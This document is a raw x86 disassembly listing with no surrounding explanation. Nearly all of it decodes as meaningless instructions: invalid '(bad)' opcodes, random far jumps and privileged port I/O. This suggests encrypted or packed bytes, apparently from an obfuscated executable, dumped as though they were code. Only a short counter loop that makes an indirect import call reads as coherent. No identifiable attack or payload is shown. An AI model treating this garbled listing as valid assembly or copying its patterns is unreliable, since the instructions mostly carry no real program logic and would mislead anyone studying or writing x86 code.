  414c73:	fld    QWORD PTR [edi]
  414c75:	pop    esi
  414c76:	xchg   ebx,eax
  414c77:	lock sbb eax,0x1188f0c7
  414c7d:	arpl   WORD PTR [ecx+esi*2+0x17],bp
  414c81:	xor    BYTE PTR [eax-0x12],dl
  414c84:	sar    DWORD PTR [ebp+0x552a48d1],cl
  414c8a:	cmp    al,0x4f
  414c8c:	retf   0x3dcd
  414c8f:	sbb    eax,0xbc6cfa3c
  414c94:	pop    ecx
  414c95:	xchg   DWORD PTR [edx+eiz*4],eax
  414c98:	push   esp
  414c99:	mov    fs,WORD PTR [ecx]
  414c9b:	adc    esp,DWORD PTR [ecx]
  414c9d:	xor    esi,DWORD PTR [ebx]
  414c9f:	or     bh,BYTE PTR [ebx-0x76]
  414ca2:	retf   0x6f9f
  414ca5:	mov    BYTE PTR [ebx],al
  414ca7:	(bad)  
  414ca8:	shr    esp,cl
  414caa:	sbb    al,0x14
  414cac:	sbb    al,0x55
  414cae:	jno    0x414d1c
  414cb0:	adc    edi,edi
  414cb2:	mov    ds:0xd136b4e0,eax
  414cb7:	xchg   esp,eax
  414cb8:	xor    eax,0xe1742a5
  414cbd:	sub    esi,DWORD PTR [edx+0xea4845d]
  414cc3:	cld    
  414cc4:	dec    edi
  414cc5:	adc    DWORD PTR [esi],eax
  414cc7:	pop    ss
  414cc8:	jmp    0x6fc2:0x5690c6b2
  414ccf:	cmp    eax,0xb63a9236
  414cd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd5:	inc    esi
  414cd6:	ret    0xfaca
  414cd9:	dec    eax
  414cda:	jmp    0x414c62
  414cdc:	fs ds pop edi
  414cdf:	je     0x414cde
  414ce1:	pop    eax
  414ce2:	jmp    0x387a:0x39e4f60b
  414ce9:	mov    ah,0x57
  414ceb:	and    edi,ebp
  414ced:	ror    DWORD PTR [edi-0xc],cl
  414cf0:	jo     0x414cea
  414cf2:	mov    edi,0xdbc8866e
  414cf7:	mov    cs,ecx
  414cf9:	scas   eax,DWORD PTR es:[edi]
  414cfa:	jecxz  0x414d24
  414cfc:	in     eax,0xa6
  414cfe:	push   ecx
  414cff:	or     al,0x7e
  414d01:	xchg   dl,dh
  414d03:	mov    ecx,0x75d3187a
  414d08:	retf   
  414d09:	xor    al,0xe3
  414d0b:	jmp    0x654f:0xc3c9c7ae
  414d12:	add    al,0x9c
  414d14:	xor    eax,0x74db30e9
  414d19:	jns    0x414d80
  414d1b:	iret   
  414d1c:	cld    
  414d1d:	jg     0x414d2b
  414d1f:	dec    ecx
  414d20:	sbb    DWORD PTR [eax],eax
  414d22:	in     al,dx
  414d23:	sti    
  414d24:	mov    ebx,0x4beb193
  414d29:	adc    DWORD PTR ds:0xc3835f37,edi
  414d2f:	out    0x10,al
  414d31:	jne    0x414daf
  414d33:	inc    eax
  414d34:	push   esp
  414d35:	pop    bx
  414d37:	jmp    0x414d1e
  414d39:	lea    edx,[edx-0x17]
  414d3c:	mov    DWORD PTR [esi],ebx
  414d3e:	mov    DWORD PTR [esi+0x3e82ce54],ebp
  414d44:	in     eax,0x15
  414d46:	es scas eax,DWORD PTR es:[edi]
  414d48:	repz test BYTE PTR [edx-0x52],dl
  414d4c:	test   DWORD PTR [edx+0xf],eax
  414d4f:	jnp    0x414dc3
  414d51:	jns    0x414d90
  414d53:	inc    ebx
  414d54:	inc    edx
  414d55:	ret    0xd9e8
  414d58:	or     BYTE PTR [esi],al
  414d5a:	dec    ebx
  414d5b:	mov    bh,0xf5
  414d5d:	call   0x5d9b:0xf38e6a16
  414d64:	mov    dh,0x4f
  414d66:	add    al,0xdc
  414d68:	pop    edx
  414d69:	out    dx,eax
  414d6a:	jmp    0x414d08
  414d6c:	fbld   TBYTE PTR [ebx+0x6aecc266]
  414d72:	mov    ds:0xf3e2ebbc,al
  414d77:	cmp    BYTE PTR [ecx],ah
  414d79:	daa    
  414d7a:	and    al,0x78
  414d7c:	cmp    bl,0x41
  414d7f:	push   0x5b
  414d81:	adc    BYTE PTR ds:0xab07018,bl
  414d87:	sub    al,0x4d
  414d89:	test   DWORD PTR [ebx],ebx
  414d8b:	cs jno 0x414dc3
  414d8e:	xchg   eax,edx
  414d90:	mov    ecx,0xb2651f3f
  414d95:	pusha  
  414d96:	mov    ds:0x910e8e60,al
  414d9b:	sub    dl,0xc4
  414d9e:	push   0x5a6e8b3a
  414da3:	sar    bh,cl
  414da5:	popf   
  414da6:	call   0x12818eaa
  414dab:	cld    
  414dac:	mov    eax,ds:0x4367fd2d
  414db1:	out    dx,al
  414db2:	add    BYTE PTR [edi],0x47
  414db5:	pop    ebp
  414db6:	imul   BYTE PTR ds:0x59cedf00
  414dbc:	fs out dx,eax
  414dbe:	aam    0x2b
  414dc0:	push   ecx
  414dc1:	pop    es
  414dc2:	dec    BYTE PTR [eax+0x8]
  414dc5:	inc    ebp
  414dc6:	cli    
  414dc7:	call   0x9eb80329
  414dcc:	jp     0x414d93
  414dce:	adc    eax,0xa98c188
  414dd3:	js     0x414dab
  414dd5:	xor    bl,ah
  414dd7:	sub    al,0xbb
  414dd9:	je     0x414dbe
  414ddb:	mov    BYTE PTR [edi-0x4],al
  414dde:	fadd   QWORD PTR [ebp-0x7293b1a9]
  414de4:	idiv   DWORD PTR ds:0x1efb1866
  414dea:	test   eax,0x3bb6e456
  414def:	das    
  414df0:	out    0xfe,al
  414df2:	add    edx,DWORD PTR [ebp-0x6c13e7e6]
  414df8:	clc    
  414df9:	sub    al,0x8b
  414dfb:	mov    ds:0x94cf628f,al
  414e00:	mov    dl,0x80
  414e02:	cs lock call 0x15e1203d
  414e09:	dec    edx
  414e0a:	pop    ebp
  414e0b:	ret    0xf33
  414e0e:	imul   ebp,ebp,0x6
  414e11:	mov    esp,0x9a8f63d7
  414e16:	mov    dl,0xda
  414e18:	and    dl,dh
  414e1a:	fwait
  414e1b:	jp     0x414da1
  414e1d:	pop    ds
  414e1e:	mov    dh,bl
  414e20:	or     BYTE PTR ds:0x27514eb0,al
  414e26:	daa    
  414e27:	mov    edx,DWORD PTR [edi]
  414e29:	aad    0xf0
  414e2b:	or     DWORD PTR [esp+ecx*8],esi
  414e2e:	daa    
  414e2f:	fmul   DWORD PTR [ebp-0x117245fb]
  414e35:	lahf   
  414e36:	xchg   esp,eax
  414e37:	in     al,dx
  414e38:	out    dx,eax
  414e39:	mov    dl,0x8b
  414e3b:	lds    ebp,FWORD PTR [edx+0x2b7cc1b3]
  414e41:	adc    eax,0x8a2631c9
  414e46:	ins    DWORD PTR es:[edi],dx
  414e47:	inc    edx
  414e48:	xchg   esi,eax
  414e49:	mov    bh,0x5e
  414e4b:	pop    ebx
  414e4c:	leave  
  414e4d:	ret    
  414e4e:	push   ebp
  414e4f:	mov    ebp,esp
  414e51:	sub    esp,0x28
  414e54:	leave  
  414e55:	ret    0xc
  414e58:	push   ebp
  414e59:	mov    ebp,esp
  414e5b:	sub    esp,0x44
  414e5e:	and    DWORD PTR ds:0x42a3e9,0x0
  414e68:	xor    edx,edx
  414e6a:	or     edx,DWORD PTR ds:0x42a3e9
  414e70:	inc    edx
  414e71:	mov    DWORD PTR ds:0x42a3e9,edx
  414e77:	cmp    DWORD PTR ds:0x42a3e9,0x5
  414e7e:	jne    0x414e9e
  414e84:	push   0x4ddc
  414e89:	push   0x2786
  414e8e:	push   0x42a321
  414e93:	push   0x42a351
  414e98:	call   DWORD PTR ds:0x4251dc
  414e9e:	cmp    DWORD PTR ds:0x42a3e9,0x4
  414ea5:	jne    0x414eb8
  414eab:	mov    edx,DWORD PTR ds:0x42a3e9
  414eb1:	inc    edx
  414eb2:	mov    DWORD PTR ds:0x42a3e9,edx
  414eb8:	cmp    DWORD PTR ds:0x42a3e9,0x12
  414ebf:	jb     0x414e68
  414ec5:	or     eax,eax
  414ec7:	jmp    0x4153d9
  414ecc:	ror    ecx,1
  414ece:	cmp    al,0xcc
  414ed0:	aam    0xd9
  414ed2:	ror    ecx,1
  414ed4:	add    esp,esp
  414ed6:	sub    BYTE PTR [ecx],dh
  414ed8:	std    
  414ed9:	and    esp,ebx
  414edb:	inc    esi
  414edc:	pushf  
  414edd:	das    
  414ede:	jg     0x414f58
  414ee0:	jae    0x414f5e
  414ee2:	js     0x414f5c
  414ee4:	lock lods al,BYTE PTR ds:[esi]
  414ee6:	jo     0x414eb8
  414ee8:	fist   DWORD PTR [eax+0x2b4de2aa]
  414eee:	gs sbb bl,dl
  414ef1:	jne    0x414f42
  414ef3:	cmp    bl,BYTE PTR [ebx+0x307a30d6]
  414ef9:	in     eax,dx
  414efa:	push   ss
  414efb:	repnz fwait
  414efd:	adc    ebx,0x291eb7fb
  414f03:	add    cl,ch
  414f05:	mov    ds:0x730316f9,al
  414f0a:	jle    0x414eb7
  414f0c:	mov    esp,0x45bbc058
  414f11:	ins    DWORD PTR es:[edi],dx
  414f12:	push   edi
  414f13:	xor    DWORD PTR [ebp+0xa],ecx
  414f16:	iret   
  414f17:	or     DWORD PTR [ecx+0x25b51c43],ebp
  414f1d:	fisubr DWORD PTR [ebx+edx*4]
  414f20:	inc    edx
  414f21:	addr16 mov al,0x8c
  414f24:	int    0x38
  414f26:	fisubr WORD PTR [edx-0x19]
  414f29:	ret    0xe36e
  414f2c:	push   esp
  414f2d:	es ins BYTE PTR es:[edi],dx
  414f2f:	mov    bh,0x9e
  414f31:	jp     0x414f07
  414f33:	inc    edi
  414f34:	and    ch,0x5c
  414f37:	mov    esi,0x613749f2
  414f3c:	adc    BYTE PTR [edi+0x1f],0xc1
  414f40:	(bad)  
  414f42:	fld    TBYTE PTR [edi+eax*1-0x27049cbf]
  414f49:	add    ah,dl
  414f4b:	dec    esp
  414f4c:	popf   
  414f4d:	loop   0x414f8c
  414f4f:	nop
  414f50:	mov    ds:0x375d4f1b,al
  414f55:	das    
  414f56:	mov    esi,edi
  414f58:	xor    ecx,DWORD PTR [esi]
  414f5a:	test   eax,0x78c6929b
  414f5f:	hlt    
  414f60:	sbb    al,0x5e
  414f62:	cvtdq2ps xmm3,XMMWORD PTR ds:0xf837cc07
  414f69:	repz dec eax
  414f6b:	or     BYTE PTR [esp+ecx*1],bl
  414f6e:	cld    
  414f6f:	or     DWORD PTR [esi+0x76b7c365],ebp
  414f75:	out    dx,al
  414f76:	cdq    
  414f77:	adc    DWORD PTR [esp+esi*2],ebx
  414f7a:	jmp    0x59fd:0x4435fc71
  414f81:	and    bl,BYTE PTR [edx-0x58fabdc]
  414f87:	ss ja  0x414f42
  414f8a:	push   edx
  414f8b:	test   BYTE PTR [edx],0x63
  414f8e:	mov    bl,0x37
  414f90:	jecxz  0x414f2d
  414f92:	sbb    BYTE PTR [eax],dh
  414f94:	cwde   
  414f95:	sbb    eax,DWORD PTR [eax]
  414f97:	dec    cl
  414f99:	mov    esp,0xe67c7d05
  414f9e:	inc    esp
  414f9f:	dec    edi
  414fa0:	pop    edi
  414fa1:	dec    ecx
  414fa2:	arpl   WORD PTR [esi+0x516a7e3f],dx
  414fa8:	adc    ch,BYTE PTR [edx+0x679a3266]
  414fae:	push   edx
  414faf:	popf   
  414fb0:	in     eax,dx
  414fb1:	mov    ebp,0x6b712c96
  414fb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fb8:	xor    esi,eax
  414fba:	add    bh,bl
  414fbc:	jnp    0x415030
  414fbe:	push   edi
  414fbf:	es popa 
  414fc1:	out    dx,al
  414fc2:	and    DWORD PTR [edi-0x19],ecx
  414fc5:	scas   al,BYTE PTR es:[edi]
  414fc6:	mov    cl,0xc5
  414fc8:	sub    DWORD PTR [esi],eax
  414fca:	adc    DWORD PTR [ebx+0x4d320cb1],ebx
  414fd0:	cmc    
  414fd1:	retf   
  414fd2:	popf   
  414fd3:	lea    ebx,[esp+esi*2]
  414fd6:	cdq    
  414fd7:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  414fd9:	xor    eax,0xdd5b0cae
  414fde:	(bad)  
  414fdf:	pop    ebp
  414fe0:	mov    eax,ds:0x45f132dd
  414fe5:	mov    eax,0x40412ac9
  414fea:	mov    ss,WORD PTR [edx]
  414fec:	push   es
  414fed:	or     al,0xf3
  414fef:	(bad)  
  414ff0:	(bad)  
  414ff1:	sar    DWORD PTR [ebx],1
  414ff3:	nop
  414ff4:	ds in  eax,0x1f
  414ff7:	xchg   esi,eax
  414ff8:	aad    0xca
  414ffa:	mov    esp,0xe0ef7cbb
  414fff:	and    edi,DWORD PTR [ebp+ecx*8-0x411c73b2]
  415006:	push   eax
  415007:	xchg   esp,eax
  415008:	cmp    al,0x33
  41500a:	push   ebp
  41500b:	jg     0x41506e
  41500d:	out    0x8f,eax
  41500f:	xchg   esp,eax
  415010:	(bad)  
  415012:	jno    0x415082
  415014:	add    bl,ch
  415016:	fild   WORD PTR [ebx+eax*4+0x66d35f79]
  41501d:	push   edi
  41501e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41501f:	mov    esp,0xbda30649
  415024:	push   es
  415025:	or     cl,bl
  415027:	xor    edx,DWORD PTR [edi]
  415029:	call   0xabdb3c0a
  41502e:	(bad)  
  41502f:	in     al,dx
  415030:	jnp    0x41507e
  415032:	jecxz  0x415051
  415034:	aam    0xbe
  415036:	adc    DWORD PTR [esp+eiz*2],ebx
  415039:	cdq    
  41503a:	pop    edx
  41503b:	xor    al,dl
  41503d:	xor    bl,BYTE PTR [edx]
  41503f:	ficom  WORD PTR [edx-0x590e02a6]
  415045:	push   ds
  415046:	inc    edi
  415047:	jl     0x41500a
  415049:	push   eax
  41504a:	mov    esi,DWORD PTR [ebx]
  41504c:	fdivp  st(1),st
  41504e:	addr16 lahf 
  415050:	inc    ebp
  415051:	inc    esp
  415052:	add    DWORD PTR [ecx+eiz*8+0x59],0x34ff600c
  41505a:	or     cl,ch
  41505c:	hlt    
  41505d:	lea    esi,[ebx+0x6c1d8261]
  415063:	cs lock pop es
  415066:	dec    ebx
  415067:	pop    ebp
  415068:	aas    
  415069:	dec    edi
  41506a:	cmp    al,0xbc
  41506c:	cmp    eax,0xf0b9b110
  415071:	int    0x7c
  415073:	pusha  
  415074:	cmp    eax,0x1b1eff4a
  415079:	repz push 0x4849378b
  41507f:	sbb    eax,0xd7d7634a
  415084:	and    cl,0xd0
  415087:	test   al,0x86
  415089:	sbb    BYTE PTR [edx-0x77],ah
  41508c:	push   esp
  41508d:	add    esp,DWORD PTR [ebp+0x47f3053f]
  415093:	fwait
  415094:	lods   al,BYTE PTR ss:[esi]
  415096:	mov    ebp,0xbead0253
  41509b:	ss fcomip st,st(7)
  41509e:	mov    bh,0xcf
  4150a0:	pop    edi
  4150a1:	neg    BYTE PTR [ebx]
  4150a3:	dec    ecx
  4150a4:	dec    ebp
  4150a5:	nop
  4150a6:	das    
  4150a7:	inc    edi
  4150a8:	xchg   ecx,eax
  4150a9:	push   ecx
  4150aa:	inc    edi
  4150ab:	sbb    dh,cl
  4150ad:	enter  0xdaa,0x32
  4150b1:	inc    ebx
  4150b2:	repnz cmp eax,0x7d2a6b08
  4150b8:	inc    ebx
  4150b9:	cmp    eax,0xa552673b
  4150be:	outs   dx,BYTE PTR ds:[esi]
  4150bf:	add    dh,BYTE PTR [ecx]
  4150c1:	shl    BYTE PTR [edi],0x57
  4150c4:	test   eax,0xe8a02d14
  4150c9:	fdivr  st,st(7)
  4150cb:	js     0x41507a
  4150cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ce:	mov    ebx,0x6ceff918
  4150d3:	test   eax,0x1419548c
  4150d8:	inc    edi
  4150d9:	xchg   esp,eax
  4150da:	rcl    BYTE PTR [eax+0x47],0x80
  4150de:	stos   DWORD PTR es:[edi],eax
  4150df:	cmc    
  4150e0:	daa    
  4150e1:	bound  ecx,QWORD PTR [edi+0x34fe6f78]
  4150e7:	in     eax,dx
  4150e8:	pop    esp
  4150e9:	fadd   QWORD PTR [esi-0x1d36cf9e]
  4150ef:	sbb    BYTE PTR [esi+ecx*8-0x5f7177e4],cl
  4150f6:	(bad)
  4150f9:	fdiv   st(6),st
  4150fb:	ja     0x4150a4
  4150fd:	mov    bl,0xc8
  4150ff:	dec    edi
  415100:	mov    bl,0x9
  415102:	loop   0x4150f9
  415104:	or     BYTE PTR [eax],dh
  415106:	out    0xde,al
  415108:	mov    esi,0xfcc8ccb
  41510d:	je     0x415102
  41510f:	mov    esp,esp
  415111:	mov    dl,0xac
  415113:	mov    BYTE PTR [eax+0x7337b785],bl
  415119:	pop    es
  41511a:	adc    al,0xd5
  41511c:	sbb    esi,DWORD PTR [ebp+0x27530855]
  415122:	mov    ch,0xfd
  415124:	jnp    0x4150d7
  415126:	mov    esi,cs
  415128:	inc    ebx
  415129:	mov    esp,0x25f78f31
  41512e:	out    dx,al
  41512f:	inc    edi
  415130:	push   eax
  415131:	test   esp,ebp
  415133:	lahf   
  415134:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  415136:	(bad)  
  415137:	(bad)  
  415139:	scas   al,BYTE PTR es:[edi]
  41513a:	dec    esi
  41513b:	test   eax,0xd9b3c4b6
  415140:	mov    ebx,0xa4525096
  415145:	xchg   edx,eax
  415146:	pop    edx
  415147:	mov    gs,WORD PTR [edi]
  415149:	or     al,0x6d
  41514b:	mov    cl,0x75
  41514d:	dec    ebx
  41514e:	int3   
  41514f:	jmp    0xd4c73961
  415154:	repz xor esp,DWORD PTR [ecx+ebx*2]
  415158:	popa   
  415159:	fdivp  st(4),st
  41515b:	daa    
  41515c:	adc    eax,0x88f6561f
  415161:	outs   dx,BYTE PTR ds:[esi]
  415162:	fcompp 
  415164:	dec    ebx
  415165:	nop
  415166:	jno    0x41519a
  415168:	jb     0x415162
  41516a:	cs ret 0xa88c
  41516e:	pop    ebp
  41516f:	add    al,0x7d
  415171:	sub    bl,BYTE PTR [ecx+0xd1fbf5]
  415177:	addr16 inc eax
  415179:	inc    ecx
  41517a:	push   eax
  41517b:	mov    al,0x13
  41517d:	hlt    
  41517e:	loopne 0x41513e
  415180:	les    edx,FWORD PTR [edi+0x19]
  415183:	int    0x23
  415185:	jmp    0x41511d
  415187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415188:	(bad)  
  41518a:	out    0x95,eax
  41518c:	imul   ecx,DWORD PTR [eax],0xd0a05c56
  415192:	mov    edi,0x78cff5d5
  415197:	jp     0x4151a8
  415199:	arpl   WORD PTR [edx-0x71fd93be],sp
  41519f:	or     al,0xe4
  4151a1:	(bad)  
  4151a2:	mov    ebp,0xd28bc568
  4151a7:	push   edx
  4151a8:	scas   eax,DWORD PTR es:[edi]
  4151a9:	aad    0xcd
  4151ab:	jbe    0x4151b5
  4151ad:	mov    ds,ebp
  4151af:	in     eax,dx
  4151b0:	adc    BYTE PTR [ecx+0x66],ah
  4151b3:	jnp    0x4151bd
  4151b5:	jno    0x41517a
  4151b7:	pop    esi
  4151b8:	jbe    0x415172
  4151ba:	jmp    DWORD PTR [eax-0x6dfbde77]
  4151c0:	sbb    edi,eax
  4151c2:	dec    ebx
  4151c3:	int    0x65
  4151c5:	adc    ah,ch
  4151c7:	xchg   BYTE PTR [esi+esi*1+0x6750c551],cl
  4151ce:	cli    
  4151cf:	xor    al,BYTE PTR [edx+ecx*1]
  4151d2:	ret    0xd63f
  4151d5:	sub    eax,0x24b99b23
  4151da:	sub    DWORD PTR [ebx],0xd3bc5249
  4151e0:	or     dl,BYTE PTR [ecx-0x74b58794]
  4151e6:	pop    ds
  4151e7:	or     esi,DWORD PTR [ebp-0x2d]
  4151ea:	arpl   WORD PTR [edx-0x65],bp
  4151ed:	stc    
  4151ee:	rcl    esp,1
  4151f0:	sbb    al,0xa5
  4151f2:	cmp    eax,0xdf267b32
  4151f7:	pusha  
  4151f8:	fwait
  4151f9:	push   es
  4151fa:	xchg   esi,eax
  4151fb:	scas   eax,DWORD PTR es:[edi]
  4151fc:	mov    edi,0x30c6010e
  415201:	icebp  
  415202:	iret   
  415203:	int3   
  415204:	or     al,0xdb
  415206:	aad    0x36
  415208:	aaa    
  415209:	jae    0x41523a
  41520b:	jae    0x41526c
  41520d:	push   edi
  41520e:	in     eax,0xd3
  415210:	loope  0x415280
  415212:	call   0xf5ef:0x6a2ff0
  415219:	cmp    edi,edx
  41521b:	clc    
  41521c:	repz pop edi
  41521e:	add    bl,bh
  415220:	jbe    0x41524a
  415222:	shl    BYTE PTR [edi],cl
  415224:	mov    ah,0x1e
  415226:	xchg   edi,eax
  415227:	mov    edx,0x72f5ab5
  41522c:	pop    es
  41522d:	rol    DWORD PTR [edi-0x2f],cl
  415230:	arpl   sp,di
  415232:	inc    esp
  415233:	test   al,0x90
  415235:	dec    edi
  415236:	das    
  415237:	xchg   BYTE PTR cs:[ecx+0x3e],dl
  41523b:	mov    ebp,0xd3104892
  415240:	push   cs
  415241:	xor    edx,DWORD PTR [ebx]
  415243:	push   cs
  415244:	pop    ds
  415245:	(bad)  
  415246:	aad    0x7e
  415248:	out    dx,al
  415249:	loopne 0x4151e0
  41524b:	mov    ah,0x55
  41524d:	and    BYTE PTR [ecx],cl
  41524f:	retf   0x6b02
  415252:	jmp    FWORD PTR [eax]
  415254:	mov    al,0x90
  415256:	imul   BYTE PTR [eax-0x20]
  415259:	int3   
  41525a:	sbb    esi,DWORD PTR [edx+0x637ddb33]
  415260:	xor    edx,esi
  415262:	call   0x2ea9:0x266db292
  415269:	(bad)  
  41526a:	fist   WORD PTR [eax]
  41526c:	lods   al,BYTE PTR ds:[esi]
  41526d:	cmove  eax,DWORD PTR [ebp+0x51f6872f]
  415274:	out    dx,eax
  415275:	rcl    BYTE PTR [eax],0xeb
  415278:	mov    ah,dh
  41527a:	dec    esi
  41527b:	mov    bl,BYTE PTR [ebp+0x61]
  41527e:	sbb    al,0xf5
  415280:	cmc    
  415281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415282:	mov    dl,0x15
  415284:	jl     0x41529f
  415286:	neg    DWORD PTR [eax]
  415288:	push   0x1c2556cc
  41528d:	mov    eax,0xe85b4aa0
  415292:	shr    ebp,cl
  415294:	pop    ecx
  415295:	sahf   
  415296:	xchg   ecx,eax
  415297:	cmp    al,0x5c
  41529a:	jo     0x4152ee
  41529c:	mov    bl,0x97
  41529e:	fsub   QWORD PTR [ebx-0x4]
  4152a1:	shr    DWORD PTR [ebx+0x6b],0xc7
  4152a5:	mov    eax,0x4be22b0f
  4152aa:	mov    edx,0x2a8da33
  4152af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152b0:	mov    ecx,DWORD PTR [edx+0x507a8962]
  4152b6:	out    dx,eax
  4152b7:	sar    eax,0xf
  4152ba:	push   ds
  4152bb:	mov    cl,0xbf
  4152bd:	enter  0x84af,0x81
  4152c1:	das    
  4152c2:	inc    ebp
  4152c3:	stc    
  4152c4:	xchg   edx,eax
  4152c5:	arpl   WORD PTR [ebp+0x53],ax
  4152c8:	cmp    ebx,DWORD PTR [esi+edi*4-0x374117f0]
  4152cf:	jp     0x4152ab
  4152d1:	jge    0x41534b
  4152d3:	or     eax,0xd761319f
  4152d8:	mov    ecx,0x5443174b
  4152dd:	test   BYTE PTR [edx+ecx*4],cl
  4152e0:	sbb    eax,0x483e803
  4152e5:	inc    cl
  4152e7:	scas   al,BYTE PTR es:[edi]
  4152e8:	jns    0x415347
  4152ea:	aad    0xf0
  4152ec:	dec    eax
  4152ed:	(bad)  [edi+0x283c4e80]
  4152f3:	jae    0x4152bb
  4152f5:	loope  0x415291
  4152f7:	mov    BYTE PTR [eax+ecx*2-0x2b4ec0b8],ch
  4152fe:	pusha  
  4152ff:	retf   0x4911
  415302:	aad    0x11
  415304:	pop    edi
  415305:	pop    edx
  415306:	pop    esi
  415307:	call   0x9442:0x43863094
  41530e:	lds    eax,FWORD PTR [eax-0x43]
  415311:	bound  ecx,QWORD PTR [ebx-0x1a]
  415314:	push   ebx
  415315:	add    esp,DWORD PTR [ebx+0x19]
  415318:	sbb    eax,0xe39754ef
  41531d:	in     eax,0x1f
  41531f:	popa   
  415320:	loope  0x4152be
  415322:	or     BYTE PTR [edi-0x1d],0xec
  415326:	sbb    BYTE PTR [edi+0x66],cl
  415329:	sub    dl,bh
  41532b:	mov    cl,0x75
  41532d:	cmp    ebx,ebx
  41532f:	adc    esp,DWORD PTR ds:0x8a6ef02d
  415335:	push   0x46c308a6
  41533a:	push   ebp
  41533b:	pop    esi
  41533c:	or     ebx,DWORD PTR [ebx+0xe]
  41533f:	jne    0x415398
  415341:	je     0x41539d
  415343:	add    esp,DWORD PTR [esp+ebx*4-0x6b]
  415347:	retf   
  415348:	sub    DWORD PTR [eax],eax
  41534a:	scas   eax,DWORD PTR es:[edi]
  41534b:	icebp  
  41534c:	push   ebp
  41534d:	mov    al,al
  41534f:	inc    ecx
  415350:	gs push ss
  415352:	js     0x415355
  415354:	addr16 pop ebp
  415356:	xor    ebp,ebx
  415358:	(bad)  
  415359:	shl    ch,cl
  41535b:	ins    BYTE PTR es:[edi],dx
  41535c:	xchg   ecx,eax
  41535d:	mov    WORD PTR [edx+0x25e20dbd],cs
  415363:	jg     0x41530d
  415365:	(bad)  
  415366:	mov    al,ds:0x155ab1c0
  41536b:	sub    BYTE PTR [edx-0x406c3f84],0x96
  415372:	cmp    dh,cl
  415374:	jae    0x4153b4
  415376:	lods   eax,DWORD PTR ds:[esi]
  415377:	push   eax
  415378:	cs push ebx
  41537a:	jno    0x4153fa
  41537c:	cli    
  41537d:	ins    BYTE PTR es:[edi],dx
  41537e:	clc    
  41537f:	cmp    ah,BYTE PTR [eax-0xf]
  415382:	(bad)  
  415383:	jmp    0x4436c2cd
  415388:	push   ss
  415389:	mov    ebp,DWORD PTR [edx]
  41538b:	mov    ebx,0x713bf13a
  415390:	dec    esi
  415391:	idiv   DWORD PTR [esi+0x57]
  415394:	adc    DWORD PTR [ebp-0x69],0x4baf8da2
  41539b:	lea    eax,[ecx-0x3fa5ccff]
  4153a1:	sbb    eax,eax
  4153a3:	and    esp,eax
  4153a5:	mov    esi,0x52800c80
  4153aa:	std    
  4153ab:	jb     0x4153b3
  4153ad:	bnd js 0x415411
  4153b0:	sub    BYTE PTR ds:0xb7ade6a0,ah
  4153b6:	outs   dx,DWORD PTR ds:[esi]
  4153b7:	stos   BYTE PTR es:[edi],al
  4153b8:	lea    edx,[esi]
  4153ba:	adc    edi,DWORD PTR [bx+si+0x9]
  4153be:	cld    
  4153bf:	or     BYTE PTR ds:0x62cf3451,al
  4153c5:	les    esi,FWORD PTR [edi+0x1051c2b9]
  4153cb:	cld    
  4153cc:	bnd jne 0x415408
  4153cf:	and    ebp,DWORD PTR [ebx+ecx*1-0x9110950]
  4153d6:	push   ds
  4153d7:	bound  ebp,QWORD PTR [eax+0x50de957]
  4153dd:	add    BYTE PTR [eax],al
  4153df:	ret    0xd7c7
  4153e2:	rcr    ecx,0xd1
  4153e5:	fcmovb st,st(7)
  4153e7:	jp     0x4153c9
  4153e9:	outs   dx,BYTE PTR ds:[esi]
  4153ea:	adc    ebp,0xffffffb6
  4153ed:	add    BYTE PTR [ecx-0x69],cl
  4153f0:	xor    bh,BYTE PTR [edi+0x78]
  4153f3:	jae    0x415471
  4153f5:	js     0x41546f
  4153f7:	or     DWORD PTR [esi-0x52],0x6c07bfb2
  4153fe:	push   cs
  4153ff:	push   0x529b2e48
  415404:	mov    bh,0x5b
  415406:	std    
  415407:	(bad)
  41540b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41540c:	dec    esi
  41540d:	stc    
  41540e:	and    al,0xdd
  415410:	ja     0x415426
  415412:	in     al,0x90
  415414:	cld    
  415415:	mov    al,0x6b
  415417:	rcl    bl,1
  415419:	push   ebp
  41541a:	xor    eax,0xabc34be9
  41541f:	repnz cmp BYTE PTR [eax],ch
  415422:	push   esi
  415423:	or     al,0x46
  415425:	(bad)  
  415426:	in     al,0xc2
  415428:	sbb    ebp,DWORD PTR [eax]
  41542a:	ds pop ebx
  41542c:	cdq    
  41542d:	mov    ss,WORD PTR [edi+0x5e]
  415430:	or     ah,BYTE PTR [ecx-0x57]
  415433:	enter  0xdb23,0x7b
  415437:	xchg   esp,eax
  415438:	in     al,dx
  415439:	(bad)  
  41543a:	in     eax,0x5e
  41543c:	jno    0x4154bd
  41543e:	les    ebp,FWORD PTR [edi+0x3dd8ce55]
  415444:	pop    ds
  415445:	les    esp,FWORD PTR [esi]
  415447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415448:	clc    
  415449:	pop    ebp
  41544a:	xchg   edx,eax
  41544b:	test   al,0x7
  41544d:	addr16 fs jge 0x4154ad
  415451:	add    ch,cl
  415453:	mov    bh,0xd5
  415455:	inc    edx
  415456:	pop    ebp
  415457:	mov    eax,ds:0xc5a3ce75
  41545c:	sbb    ecx,DWORD PTR [edx]
  41545e:	xchg   edx,eax
  41545f:	mov    al,ds:0xc513e91e
  415464:	ja     0x41542b
  415466:	pop    esp
  415467:	jno    0x415486
  415469:	xchg   esp,eax
  41546a:	sti    
  41546b:	mov    WORD PTR [esi-0x14dc9025],fs
  415471:	test   DWORD PTR [ebx-0x4712b56a],edi
  415477:	ss fwait
  415479:	mov    ch,dl
  41547b:	(bad)  [edi]
  41547d:	mov    dh,0x48
  41547f:	sub    al,0x25
  415481:	pop    ebx
  415482:	scas   al,BYTE PTR es:[edi]
  415483:	pop    ebp
  415484:	mov    ch,0x77
  415486:	jmp    0x415467
  415488:	mov    al,0x90
  41548a:	mov    bh,0x72
  41548c:	pop    esi
  41548d:	ret    
  41548e:	jnp    0x415462
  415490:	test   ecx,esi
  415492:	adc    eax,0xc8234bf7
  415497:	mov    ecx,0xdffb8a46
